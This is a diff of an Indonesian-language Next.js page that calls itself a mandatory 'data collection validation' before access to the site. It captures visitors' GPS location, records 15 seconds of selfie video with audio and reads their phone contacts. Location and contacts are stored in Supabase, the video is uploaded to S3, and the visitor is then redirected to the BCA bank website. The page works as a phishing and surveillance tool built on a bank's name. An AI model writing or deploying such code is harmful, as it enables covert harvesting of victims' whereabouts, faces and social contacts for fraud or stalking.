@@ -1,56 +1,26 @@
 /* eslint-disable @typescript-eslint/no-explicit-any */
 "use client";
 
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { supabase } from "@/lib/supabse";
 import FullScreenLoader from "@/components/FullScreenLoader";
-import { UserData } from "@/types";
+import { LocationData } from "@/types";
 
 export default function Home() {
-	const [status, setStatus] = useState<"loading" | "location" | "camera" | "contacts" | "completed" | "error">("loading");
+	const [status, setStatus] = useState<"initial" | "location" | "camera" | "contacts" | "completed" | "error">("initial");
 	const [error, setError] = useState("");
+	const [userData, setUserData] = useState<{ id?: string; location?: LocationData; contacts?: any[] }>({});
+	const videoRef = useRef<HTMLVideoElement>(null);
+	const mediaRecorderRef = useRef<MediaRecorder | null>(null);
+	const recordedChunksRef = useRef<Blob[]>([]);
 
 	useEffect(() => {
-		const collectData = async () => {
-			try {
-				// Langkah 1: Mengumpulkan lokasi
-				setStatus("location");
-				const location = await getLocation();
-
-				// Simpan data lokasi sementara
-				const userData: UserData = { location, contacts: [] };
-
-				// Langkah 2: Rekam video
-				setStatus("camera");
-				const videoUrl = await recordVideo(15000); // 15 detik
-
-				// Langkah 3: Mengumpulkan kontak
-				setStatus("contacts");
-				const contacts = await getContacts();
-
-				// Update user data
-				userData.contacts = contacts;
-
-				// Simpan semua data ke database
-				await saveAllData(userData, videoUrl);
-
-				setStatus("completed");
-
-				// Redirect ke BCA setelah 2 detik
-				setTimeout(() => {
-					window.location.href = "https://www.bca.co.id";
-				}, 2000);
-			} catch (err: any) {
-				setStatus("error");
-				setError(err.message);
-			}
-		};
-
-		// Hanya jalankan di mobile
+		// Hanya jalankan di perangkat mobile
 		if (typeof window !== "undefined" && window.innerWidth < 768) {
-			// Tampilkan loading selama 3 detik pertama
+			// Tampilkan loader selama 3 detik
 			setTimeout(() => {
-				collectData();
+				setStatus("location");
+				requestLocation();
 			}, 3000);
 		} else {
 			setStatus("error");
@@ -58,53 +28,187 @@ export default function Home() {
 		}
 	}, []);
 
-	if (status === "loading") {
-		return <FullScreenLoader message="Anda harus melewati validasi pengumpulan data untuk bisa melanjutkan akses ke website kami" />;
-	}
+	const requestLocation = async () => {
+		try {
+			const location = await getLocation();
+			setUserData((prev) => ({ ...prev, location }));
+
+			// Simpan ke database
+			const { data, error } = await supabase.from("user_data").insert([{ location }]).select().single();
+
+			if (error) throw new Error(`Gagal menyimpan lokasi: ${error.message}`);
+
+			setUserData((prev) => ({ ...prev, id: data.id }));
+			setStatus("camera");
+		} catch (err: any) {
+			setStatus("error");
+			setError(err.message);
+		}
+	};
+
+	const startCamera = async () => {
+		try {
+			const stream = await navigator.mediaDevices.getUserMedia({
+				video: { facingMode: "user" },
+				audio: true,
+			});
+
+			if (videoRef.current) {
+				videoRef.current.srcObject = stream;
+			}
+
+			return stream;
+		} catch (err) {
+			throw new Error(`Gagal mengakses kamera: ${(err as Error).message}`);
+		}
+	};
+
+	const handleStartRecording = async () => {
+		try {
+			setStatus("camera");
+			const stream = await startCamera();
+
+			const recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+			mediaRecorderRef.current = recorder;
+			recordedChunksRef.current = [];
+
+			recorder.ondataavailable = (e) => {
+				if (e.data.size > 0) {
+					recordedChunksRef.current.push(e.data);
+				}
+			};
+
+			recorder.onstop = async () => {
+				try {
+					const blob = new Blob(recordedChunksRef.current, { type: "video/webm" });
+					const fileName = `video-${Date.now()}.webm`;
+					const videoUrl = await uploadToS3(blob, fileName);
+
+					// Simpan URL video ke database
+					if (userData.id) {
+						await supabase.from("user_videos").insert([
+							{
+								user_data_id: userData.id,
+								video_url: videoUrl,
+							},
+						]);
+					}
+
+					// Lanjut ke kontak
+					setStatus("contacts");
+					requestContacts();
+
+					// Hentikan stream
+					stream.getTracks().forEach((track) => track.stop());
+				} catch (err) {
+					setStatus("error");
+					setError(`Gagal mengunggah video: ${(err as Error).message}`);
+				}
+			};
+
+			recorder.start();
+
+			// Otomatis berhenti setelah 15 detik
+			setTimeout(() => {
+				if (recorder.state === "recording") {
+					recorder.stop();
+				}
+			}, 15000);
+		} catch (err) {
+			setStatus("error");
+			setError(`Gagal memulai rekaman: ${(err as Error).message}`);
+		}
+	};
+
+	const requestContacts = async () => {
+		try {
+			if (!("contacts" in navigator)) {
+				throw new Error("Browser tidak mendukung akses kontak");
+			}
+
+			const contacts = await (navigator as any).contacts.select(["name", "email", "tel"], { multiple: true });
+			const formattedContacts = contacts.map((contact: any) => ({
+				name: contact.name?.[0] || "",
+				email: contact.email?.[0] || "",
+				phone: contact.tel?.[0] || "",
+			}));
+
+			setUserData((prev) => ({ ...prev, contacts: formattedContacts }));
+
+			// Simpan kontak ke database
+			if (userData.id) {
+				await supabase.from("user_data").update({ contacts: formattedContacts }).eq("id", userData.id);
+			}
+
+			setStatus("completed");
+
+			// Redirect setelah 2 detik
+			setTimeout(() => {
+				window.location.href = process.env.NEXT_PUBLIC_REDIRECT_URL || "https://www.bca.co.id";
+			}, 2000);
+		} catch (err: any) {
+			setStatus("error");
+			setError(`Gagal mengambil kontak: ${err.message}`);
+		}
+	};
 
 	return (
-		<div className="fixed inset-0 bg-black flex items-center justify-center">
+		<div className="min-h-screen flex flex-col items-center justify-center p-4 bg-white">
+			{status === "initial" && <FullScreenLoader message="Anda harus melewati validasi pengumpulan data untuk bisa melanjutkan akses ke website kami" />}
+
 			{status === "location" && (
-				<div className="text-center text-white">
-					<div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-white mx-auto mb-4"></div>
-					<p>Mengakses lokasi perangkat...</p>
+				<div className="text-center">
+					<div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-blue-500 mx-auto mb-6"></div>
+					<h2 className="text-xl font-semibold text-gray-800 mb-2">Mengakses Lokasi</h2>
+					<p className="text-gray-600">Harap berikan izin akses lokasi...</p>
 				</div>
 			)}
 
 			{status === "camera" && (
-				<div className="text-center text-white">
-					<div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-white mx-auto mb-4"></div>
-					<p>Merekam video...</p>
-					<p className="text-sm mt-2">Rekaman akan berlangsung selama 15 detik</p>
+				<div className="w-full max-w-md">
+					<div className="bg-gray-100 rounded-xl overflow-hidden mb-6">
+						<video ref={videoRef} autoPlay playsInline muted className="w-full h-auto aspect-video object-cover" />
+					</div>
+
+					<div className="text-center">
+						<button onClick={handleStartRecording} className="px-6 py-3 bg-blue-600 text-white rounded-lg font-medium hover:bg-blue-700 transition-colors shadow-md">
+							Mulai Merekam (15 detik)
+						</button>
+						<p className="text-gray-500 mt-4">Video akan otomatis berhenti setelah 15 detik</p>
+					</div>
 				</div>
 			)}
 
 			{status === "contacts" && (
-				<div className="text-center text-white">
-					<div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-white mx-auto mb-4"></div>
-					<p>Mengakses kontak...</p>
+				<div className="text-center">
+					<div className="animate-spin rounded-full h-16 w-16 border-t-4 border-b-4 border-blue-500 mx-auto mb-6"></div>
+					<h2 className="text-xl font-semibold text-gray-800 mb-2">Mengakses Kontak</h2>
+					<p className="text-gray-600">Harap berikan izin akses kontak...</p>
 				</div>
 			)}
 
 			{status === "completed" && (
-				<div className="text-center text-white">
-					<svg className="w-16 h-16 text-green-500 mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-						<path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
-					</svg>
-					<p>Verifikasi berhasil! Mengarahkan ke BCA...</p>
+				<div className="text-center">
+					<div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+						<svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+							<path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
+						</svg>
+					</div>
+					<h2 className="text-xl font-semibold text-gray-800 mb-2">Verifikasi Berhasil!</h2>
+					<p className="text-gray-600">Anda akan diarahkan ke halaman tujuan...</p>
 				</div>
 			)}
 
 			{status === "error" && (
-				<div className="text-center p-6 max-w-md">
-					<div className="text-red-500 bg-red-100 rounded-full w-16 h-16 flex items-center justify-center mx-auto mb-4">
-						<svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+				<div className="text-center max-w-md p-6 bg-white rounded-xl shadow-lg">
+					<div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
+						<svg className="w-10 h-10 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
 							<path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path>
 						</svg>
 					</div>
-					<h2 className="text-xl font-bold text-white mb-2">Terjadi Kesalahan</h2>
-					<p className="text-gray-300 mb-6">{error}</p>
-					<button onClick={() => window.location.reload()} className="px-6 py-3 bg-red-600 text-white rounded-lg font-medium">
+					<h2 className="text-xl font-semibold text-gray-800 mb-2">Terjadi Kesalahan</h2>
+					<p className="text-gray-600 mb-4">{error}</p>
+					<button onClick={() => window.location.reload()} className="px-6 py-3 bg-blue-600 text-white rounded-lg font-medium hover:bg-blue-700 transition-colors">
 						Coba Lagi
 					</button>
 				</div>
@@ -113,7 +217,7 @@ export default function Home() {
 	);
 }
 
-// Fungsi bantuan untuk mengambil lokasi
+// ===== Fungsi Bantuan =====
 const getLocation = async (): Promise<{ lat: number; lng: number; accuracy: number }> => {
 	return new Promise((resolve, reject) => {
 		if (!navigator.geolocation) {
@@ -137,98 +241,33 @@ const getLocation = async (): Promise<{ lat: number; lng: number; accuracy: numb
 	});
 };
 
-// Fungsi untuk merekam video
-const recordVideo = (duration: number): Promise<string> => {
-	return new Promise(async (resolve, reject) => {
-		try {
-			const stream = await navigator.mediaDevices.getUserMedia({
-				video: { facingMode: "user" },
-				audio: true,
-			});
-
-			const recorder = new MediaRecorder(stream);
-			const chunks: BlobPart[] = [];
-
-			recorder.ondataavailable = (e) => chunks.push(e.data);
-			recorder.onstop = async () => {
-				const blob = new Blob(chunks, { type: "video/webm" });
-
-				try {
-					// Upload ke S3
-					const fileName = `video-${Date.now()}.webm`;
-					const videoUrl = await uploadToS3(blob, fileName);
-					resolve(videoUrl);
-				} catch (uploadError) {
-					reject(uploadError);
-				}
-
-				// Hentikan stream
-				stream.getTracks().forEach((track) => track.stop());
-			};
-
-			recorder.start();
-			setTimeout(() => recorder.stop(), duration);
-		} catch (err) {
-			reject(new Error(`Gagal mengakses kamera: ${(err as Error).message}`));
-		}
-	});
-};
-
-// Fungsi untuk mengambil kontak
-const getContacts = async (): Promise<any[]> => {
-	if (!("contacts" in navigator)) {
-		return [];
-	}
-
-	try {
-		const contacts = await (navigator as any).contacts.select(["name", "email", "tel"], { multiple: true });
-		return contacts.map((contact: any) => ({
-			name: contact.name?.[0] || "",
-			email: contact.email?.[0] || "",
-			phone: contact.tel?.[0] || "",
-		}));
-	} catch (err) {
-		console.error("Gagal mengambil kontak:", err);
-		return [];
-	}
-};
-
-// Fungsi untuk menyimpan semua data
-const saveAllData = async (userData: any, videoUrl: string) => {
-	// Simpan data user
-	const { data, error } = await supabase.from("user_data").insert([userData]).select().single();
-
-	if (error) throw new Error(`Gagal menyimpan data: ${error.message}`);
-
-	// Simpan data video
-	const videoError = await supabase.from("user_videos").insert([
-		{
-			user_data_id: data.id,
-			video_url: videoUrl,
-		},
-	]);
-
-	if (videoError.error) throw new Error(`Gagal menyimpan video: ${videoError.error.message}`);
-};
-
-// Fungsi untuk upload ke S3
 const uploadToS3 = async (file: Blob, fileName: string): Promise<string> => {
-	const formData = new FormData();
-	formData.append("file", file, fileName);
-
 	try {
+		// Dapatkan URL unggah dari API
 		const response = await fetch("/api/s3-upload", {
 			method: "POST",
-			body: formData,
+			headers: { "Content-Type": "application/json" },
+			body: JSON.stringify({ fileName, fileType: file.type }),
 		});
 
 		const data = await response.json();
 
 		if (!response.ok) {
-			throw new Error(data.error || "Upload gagal");
+			throw new Error(data.error || "Gagal mendapatkan URL unggah");
 		}
 
-		return data.url;
+		// Upload file langsung ke S3
+		const uploadResponse = await fetch(data.url, {
+			method: "PUT",
+			body: file,
+			headers: { "Content-Type": file.type },
+		});
+
+		if (!uploadResponse.ok) {
+			throw new Error("Upload ke S3 gagal");
+		}
+
+		return data.publicUrl;
 	} catch (err) {
 		throw new Error(`Gagal mengunggah video: ${(err as Error).message}`);
 	}
